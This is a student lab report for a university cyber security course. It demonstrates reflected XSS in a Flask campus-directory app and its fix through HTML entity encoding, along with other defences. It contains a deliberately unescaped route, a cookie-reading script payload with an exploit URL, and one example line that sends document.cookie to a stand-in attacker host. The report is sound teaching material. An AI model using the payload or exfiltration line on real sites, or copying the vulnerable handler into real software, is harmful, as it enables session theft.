# INDIAN INSTITUTE OF INFORMATION TECHNOLOGY ALLAHABAD
### Department of Information Technology
**Course:** Cyber Security (IT-30001) | Autumn Semester 2026  
**Assignment:** Web Server Security — Exploitation and Mitigation  
**Course Instructor:** Dr. Soumyadev Maity  

---

# Lab Report: Exploitation & Mitigation of Reflected Cross-Site Scripting (XSS)

### Student & Submission Metadata
- **Group ID:** Group 16
- **Student Name:** BENDRAM ANJAN SHIVA REDDY
- **Roll Number:** IIT2024265
- **Vulnerability Category:** Cross-Site Scripting (XSS)
- **Variant Implemented:** Variant 2 — Reflected XSS
- **Repository URL:** [https://github.com/anjanshivareddy/reflected_xss](https://github.com/anjanshivareddy/reflected_xss)
- **Date of Submission:** October 28, 2026

---

## 1. Ownership Declaration Table (Table 3)

| Member name | Roll number | Category | Variant implemented |
| :--- | :--- | :--- | :--- |
| **BENDRAM ANJAN SHIVA REDDY** | **IIT2024265** | Cross-Site Scripting (XSS) | Reflected XSS (Variant 2) |

---

## 2. Overview of Cross-Site Scripting (XSS) & Its Variants

### 2.1 What is Cross-Site Scripting (XSS)?
Cross-Site Scripting (XSS) is a prevalent client-side code injection vulnerability that arises when a web application accepts untrusted user input and includes it in a web page delivered to the user without sufficient validation, sanitization, or contextual output encoding. 

When an XSS vulnerability exists, an attacker can inject malicious client-side code (primarily JavaScript) into the target web application. Because the injected code is returned by the trusted origin server, the victim's web browser cannot distinguish between legitimate script instructions supplied by the developer and malicious scripts injected by the attacker. Consequently, the browser executes the script within the security context of the victim's session, violating the fundamental **Same-Origin Policy (SOP)**. 

Through XSS, attackers can:
1. Steal session tokens and cookies (`document.cookie`), leading to account takeover.
2. Intercept sensitive user keystrokes (keylogging) and credentials.
3. Perform unauthorized actions on behalf of the victim (acting as a client-side proxy).
4. Deface web page content or force phishing redirects.

---

### 2.2 Classification of Assignment Handout Variants

According to Table 1 of the course assignment handout, Cross-Site Scripting encompasses two distinct variants:

```
                      +-----------------------------------+
                      |   Cross-Site Scripting (XSS)     |
                      +-----------------+-----------------+
                                        |
                 +----------------------+----------------------+
                 |                                             |
                 v                                             v
     +-----------------------+                     +-----------------------+
     |       Variant 1       |                     |       Variant 2       |
     |   Stored XSS (Type I) |                     | Reflected XSS (Type II) |
     +-----------------------+                     +-----------------------+
     | • Persistent storage  |                     | • Non-persistent      |
     | • Stored in Database  |                     | • Echoed in response  |
     | • Multi-victim impact |                     | • URL / link crafted  |
     | • Asynchronous attack |                     | • Immediate execution |
     +-----------------------+                     +-----------------------+
```

#### Variant 1: Stored XSS (Persistent XSS)
In **Stored XSS** (also known as Type-I or Persistent XSS), the injected malicious script is permanently stored on the target server's storage subsystems, such as a database, comment field, bulletin board post, or user profile bio. 

When other legitimate users request the stored resource later, the web application retrieves the untrusted data from the database and inserts it directly into the HTML response stream without contextual escaping. Every user who views the contaminated page automatically executes the malicious script in their local browser. Stored XSS represents high systemic risk because an attacker only needs to inject the payload once to compromise numerous victims asynchronously without requiring targeted social engineering.

#### Variant 2: Reflected XSS (Non-Persistent XSS) — *Assigned Variant*
In **Reflected XSS** (also known as Type-II or Non-Persistent XSS), the malicious script is not stored on the target server. Instead, untrusted user data supplied in the immediate HTTP request (such as an HTTP GET query parameter like `?q=...`, search query, or HTTP header) is immediately echoed back ("reflected") by the server in the HTTP response body without prior sanitization or output encoding.

Reflected XSS attacks are typically delivered via social engineering: an attacker crafts a malicious link containing the script payload in the URL parameters and lures the victim into clicking it (e.g., via phishing emails or messaging platforms). Once clicked, the victim's browser sends the request to the vulnerable web application, the application reflects the payload in its response, and the script executes instantly inside the victim's authenticated browser context.

---

## 3. Detailed Implementation of Variant 2: Reflected XSS

For this assignment, a complete educational web application modeling a **"Campus Directory Search"** portal was developed in Python using Flask (`app.py`). The portal allows students and faculty at IIIT Allahabad to search campus directory records.

---

### (a) Vulnerable Implementation (Code Path)

The vulnerable implementation is encapsulated in the `/vulnerable` route within [`app.py`](file:///Users/anjan/Desktop/cyber/app.py).

#### Source Code Path (`@app.route('/vulnerable')`):
```python
# ------------------------------------------------------------------------------
# Route 1: Vulnerable Implementation
# ------------------------------------------------------------------------------
@app.route('/vulnerable')
def vulnerable_search():
    """
    Vulnerable Search Endpoint:
    Receives user query 'q' via GET parameter and directly reflects it into HTML.
    """
    # Extract query parameter from the HTTP GET request
    query = request.args.get('q', '')

    # ==========================================================================
    # (a) VULNERABLE IMPLEMENTATION: Unencoded user input reflected directly in HTML.
    # ==========================================================================
    # The server accepts the user-supplied 'q' parameter and concatenates it
    # directly into the HTML response document WITHOUT entity encoding or sanitization.
    # When the client browser parses the returned HTML, any script tags or event
    # handlers in 'query' will be executed in the victim's browser session.
    reflected_output = query

    # Render HTML page with the raw, unencoded reflection
    rendered_html = build_page_template(
        mode='vulnerable',
        query=query,
        reflected_output=reflected_output,
        is_vulnerable=True
    )

    # Wrap in Flask response to attach non-sensitive session cookie for live proof
    response = make_response(rendered_html)
    response.set_cookie('demo_session', 'IIITA_Student_123', samesite='Lax')
    return response
```

#### Flaw Analysis:
1. The server reads `request.args.get('q', '')` directly from user-controlled GET parameters.
2. In `build_page_template()`, `reflected_output` is injected into the HTML stream using direct string interpolation without escaping:
   ```html
   Showing search results for: <span class="reflected-term" id="reflected-output">{reflected_output}</span>
   ```
3. When the HTTP response body reaches the client browser, the browser's HTML parser parses characters sequentially. When it encounters `<script>`, the parser transitions from `DATA_STATE` to `SCRIPT_DATA_STATE`, parsing and executing the attacker's script verbatim.

---

### (b) Working Exploit & Evidence

#### 1. Exact Exploit Payload
```html
<script>alert('Reflected XSS Executed! Cookie: ' + document.cookie)</script>
```

#### 2. Full HTTP Exploit Request URL
```
http://127.0.0.1:5001/vulnerable?q=%3Cscript%3Ealert('Reflected+XSS+Executed!+Cookie:+'+%2B+document.cookie)%3C/script%3E
```

#### 3. Execution Mechanics & Cookie Exfiltration Proof
- **Session Cookie Setup:** On page load, the server issues an active dummy session cookie: `demo_session=IIITA_Student_123`.
- **Deliberate Absence of HttpOnly:** The `HttpOnly` flag was intentionally omitted on this demonstration cookie to prove that JavaScript running in the page's origin can access session credentials through the `document.cookie` DOM API.
- **Trigger Sequence:**
  1. The victim visits the crafted URL or enters the payload into the campus search box.
  2. The Flask server responds with an HTTP 200 containing the raw `<script>` tag inside `<span class="reflected-term">`.
  3. The victim's browser parses the tag, immediately pauses HTML rendering, and executes `alert('Reflected XSS Executed! Cookie: ' + document.cookie)`.
  4. A visible browser modal dialog fires displaying the secret session cookie, proving that an attacker could exfiltrate this session identifier to a remote command-and-control server (e.g., via `fetch('https://attacker.com/steal?c=' + document.cookie)`).

```
+--------------------------------------------------------------------------------------------------+
| [PLACEHOLDER FOR SCREENSHOT 1: WORKING REFLECTED XSS EXPLOIT]                                    |
|                                                                                                  |
| Caption: Figure 1: Working Reflected XSS exploit on /vulnerable showing modal alert box         |
| displaying the victim's session cookie "demo_session=IIITA_Student_123".                         |
+--------------------------------------------------------------------------------------------------+
```

```
+--------------------------------------------------------------------------------------------------+
| [PLACEHOLDER FOR SCREENSHOT 2: RAW SERVER RESPONSE INSPECTOR IN VULNERABLE MODE]                 |
|                                                                                                  |
| Caption: Figure 2: UI Raw Server Response Inspector showing unencoded <script> tags delivered    |
| verbatim in the HTTP response body.                                                              |
+--------------------------------------------------------------------------------------------------+
```

---

### (c) Root Cause Analysis

> **Root Cause (Two-Line Formulation):**  
> User-controlled input from the HTTP GET request is reflected directly into the HTML DOM context without output encoding, causing the browser's HTML parser to switch from data state to script execution state.

---

## 4. Mitigation Techniques for Cross-Site Scripting

### (d) Implemented Mitigation — Context-Aware HTML Entity Encoding

The implemented fix is housed in the `/secure` endpoint within [`app.py`](file:///Users/anjan/Desktop/cyber/app.py).

#### Source Code Path (`@app.route('/secure')`):
```python
# ------------------------------------------------------------------------------
# Route 2: Secured Implementation
# ------------------------------------------------------------------------------
@app.route('/secure')
def secure_search():
    """
    Secured Search Endpoint:
    Receives user query 'q' and applies context-aware HTML entity encoding.
    """
    # Extract query parameter from the HTTP GET request
    query = request.args.get('q', '')

    # ==========================================================================
    # (d) MITIGATION IMPLEMENTED: Context-aware HTML entity encoding.
    # ==========================================================================
    # Python's built-in html.escape() performs context-aware entity encoding for HTML body:
    #   '&' -> '&amp;'
    #   '<' -> '&lt;'
    #   '>' -> '&gt;'
    #   '"' -> '&quot;'
    #   "'" -> '&#x27;'
    # This guarantees that characters with special meaning in the HTML grammar are
    # treated purely as visual character data by the browser's DOM parser, completely
    # preventing the browser from interpreting the input as executable JavaScript.
    safe_query = html.escape(query)
    reflected_output = safe_query

    # Render HTML page with the safely encoded reflection
    rendered_html = build_page_template(
        mode='secure',
        query=query,
        reflected_output=reflected_output,
        is_vulnerable=False
    )

    # Wrap in Flask response and set same non-sensitive session cookie
    response = make_response(rendered_html)
    response.set_cookie('demo_session', 'IIITA_Student_123', samesite='Lax')
    return response
```

#### How Context-Aware Entity Encoding Works:
HTML entity encoding neutralizes XSS by replacing characters that hold structural meaning in HTML syntax with their corresponding named character entities or numeric character references:

| Raw Character | Semantic Meaning in HTML | Encoded Safe Entity | Browser Parser Interpretation |
| :---: | :--- | :---: | :--- |
| `<` | Opens an HTML tag or script directive | `&lt;` | Display character `<` (Data state maintained) |
| `>` | Closes an HTML tag attribute or element | `&gt;` | Display character `>` |
| `&` | Entity reference introducer | `&amp;` | Display character `&` |
| `"` | Delimits double-quoted HTML attributes | `&quot;` | Display character `"` |
| `'` | Delimits single-quoted HTML attributes | `&#x27;` | Display character `'` |

#### Defense Verification:
When the identical attack payload `<script>alert('Reflected XSS Executed! Cookie: ' + document.cookie)</script>` is submitted to `/secure`:
1. The server calls `html.escape()`, transforming the string into:
   ```html
   &lt;script&gt;alert(&#x27;Reflected XSS Executed! Cookie: &#x27; + document.cookie)&lt;/script&gt;
   ```
2. The browser HTML parser encounters `&lt;`. It recognizes this as character data to be rendered on screen, rather than a tag opening bracket `<`.
3. The browser remains in the HTML `DATA_STATE`. **No JavaScript is executed, no alert appears**, and the search term is safely printed on screen as literal text:
   `Showing search results for: <script>alert(...)</script>`.

```
+--------------------------------------------------------------------------------------------------+
| [PLACEHOLDER FOR SCREENSHOT 3: SECURED ENDPOINT NEUTRALIZING XSS PAYLOAD]                        |
|                                                                                                  |
| Caption: Figure 3: Secured endpoint /secure displaying the payload as harmless literal text      |
| with zero script execution, alongside the Inspector showing &lt;script&gt; entities.            |
+--------------------------------------------------------------------------------------------------+
```

---

### (e) All Other XSS Mitigation Techniques (Theory from Lecture Slides)

As outlined in Dr. Soumyadev Maity's lecture slides, comprehensive web defense relies on defense-in-depth across multiple architectural layers:

```
+---------------------------------------------------------------------------------------+
|                         DEFENSE-IN-DEPTH FOR XSS                                      |
+---------------------------------------------------------------------------------------+
| 1. Context-Aware Output Encoding  -> html.escape() / context encoders                 |
| 2. Framework Auto-Escaping         -> Jinja2, React JSX, Angular default escaping      |
| 3. HTML Sanitization for Rich Text-> DOMPurify, Bleach allow-lists                    |
| 4. Content Security Policy (CSP)  -> HTTP Header restricting script sources & nonces |
| 5. HttpOnly Session Cookies        -> Set-Cookie: ...; HttpOnly (Mitigate impact)     |
| 6. Safe DOM Sinks                 -> Use textContent/innerText instead of innerHTML   |
+---------------------------------------------------------------------------------------+
```

#### 1. Framework Auto-Escaping
Modern full-stack and web templating frameworks (e.g., Jinja2 in Flask, Django Templates, Angular, React JSX) implement automatic contextual escaping by default. 
- *Mechanism:* When variables are passed to a template (e.g., `{{ user_input }}` in Jinja2), the template engine automatically inspects the template context (HTML body, attribute, or URI) and applies appropriate escaping before serializing the response.
- *Developer Risk:* Auto-escaping eliminates manual developer oversights. However, vulnerabilities can still be introduced if a developer bypasses auto-escaping using unsafe escape-disabling filters, such as `{{ user_input | safe }}` in Jinja2 or `dangerouslySetInnerHTML={{ __html: user_input }}` in React.

#### 2. HTML Sanitiser for Rich HTML
Simple HTML entity encoding cannot be applied in scenarios where users must be permitted to supply formatted markup (such as rich-text blog editors, academic forum submissions, or campus announcements using bold `<b>`, italics `<i>`, or links `<a>`). If entity encoding were used, it would convert `<b>` into `&lt;b&gt;`, destroying the intended formatting.
- *Mechanism:* An allow-list HTML sanitizer (such as *DOMPurify* in JavaScript or *Bleach* in Python) parses the input string into a live DOM tree. It iterates over every node, matching each tag and attribute against an explicit allow-list. Dangerous tags (`<script>`, `<iframe>`, `<object>`, `<embed>`) and active event attributes (`onerror=`, `onload=`, `onclick=`, `href="javascript:..."`) are surgically stripped away while benign structural elements (`<p>`, `<b>`, `<em>`) are preserved.

#### 3. Content Security Policy (CSP)
Content Security Policy is an HTTP response header that provides a robust browser-enforced defense-in-depth boundary against client-side code execution:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none';
```
- *Mechanism:* When CSP is delivered by the server, the browser refuses to execute any inline `<script>` tags, inline event handlers (`onload=...`), or string-to-code evaluations (`eval()`), unless the script tag carries a cryptographically secure, single-use nonce matching the response header (`<script nonce="rAnd0m123">`). Furthermore, CSP restricts the domain origins from which external `.js` files may be fetched.
- *Impact on Reflected XSS:* Even if an application contains an unencoded reflection flaw, a strict CSP header prevents the browser from executing the injected inline payload.

#### 4. HttpOnly Cookies
The `HttpOnly` flag is an attribute added to the `Set-Cookie` HTTP response header:
```http
Set-Cookie: session_id=s3cur3t0k3n_IIITA; Secure; HttpOnly; SameSite=Strict
```
- *Mechanism:* When the `HttpOnly` flag is set, the browser forbids client-side JavaScript APIs (specifically `document.cookie`) from reading or modifying the cookie. 
- *Impact on XSS:* While `HttpOnly` does not prevent the XSS script from executing in the victim's browser, it neutralizes the single most destructive impact of XSS: automated session hijacking. An attacker injecting `<script>alert(document.cookie)</script>` receives an empty string or will be unable to exfiltrate the authentication token.

#### 5. Safe DOM Sinks
In client-side single-page applications (SPAs) and JavaScript codebases, DOM-based XSS occurs when user-controlled data is written into hazardous DOM manipulation sinks that invoke the browser's HTML parser:
- *Dangerous Sinks:* `element.innerHTML`, `element.outerHTML`, `document.write()`, `document.writeln()`, `window.location.href = "javascript:..."`.
- *Safe Sinks:* Developers must instead route untrusted data into safe sinks that manipulate text nodes directly:
  - `element.textContent = user_input;`
  - `element.innerText = user_input;`
  - `document.createTextNode(user_input);`
- *Mechanism:* Safe DOM sinks treat input purely as character sequences in the DOM tree, bypassing the browser's HTML parser entirely and making code execution structurally impossible.

---

## 5. Comparative Summary: Vulnerable vs. Secured Implementation

| Parameter | Vulnerable Mode (`/vulnerable`) | Secured Mode (`/secure`) |
| :--- | :--- | :--- |
| **HTTP Route** | `GET /vulnerable?q=<payload>` | `GET /secure?q=<payload>` |
| **Server-Side Handling** | Direct string interpolation (`query`) | Context-aware encoding (`html.escape(query)`) |
| **HTTP Response Body** | `...<span><script>alert(1)</script></span>...` | `...<span>&lt;script&gt;alert(1)&lt;/script&gt;</span>...` |
| **Browser Parser State** | Switches from `DATA_STATE` to `SCRIPT_DATA_STATE` | Remains strictly in `DATA_STATE` |
| **Client Execution** | Injected JavaScript executes immediately | Zero code execution; rendered as harmless text |
| **Cookie Confidentiality**| Compromised (`document.cookie` exposed) | Protected (No script execution occurs) |
| **Root Vulnerability** | CWE-79: Cross-Site Scripting (Reflected) | Defended via contextual output encoding |

---

## 6. Conclusion

In this assignment, the mechanics of **Reflected Cross-Site Scripting (Variant 2)** were demonstrated through a real-world campus directory scenario. The vulnerability was analyzed down to its root cause: the failure of the server to contextualize untrusted input before reflecting it into an HTML execution context. 

The primary defense &mdash; **Context-Aware HTML Entity Encoding** &mdash; was implemented and verified to completely block the exploit by transforming syntactically active HTML characters into inert character entities. Finally, complementary defense-in-depth measures from the course lecture slides &mdash; framework auto-escaping, HTML sanitizers, Content Security Policy, HttpOnly cookies, and safe DOM sinks &mdash; were studied to provide a comprehensive architectural security model for modern web applications.

---

### Student Sign-off
**Name:** BENDRAM ANJAN SHIVA REDDY  
**Roll Number:** IIT2024265  
**Group ID:** Group 16  
**Course:** Cyber Security (IT-30001), Autumn Semester 2026, IIIT Allahabad  
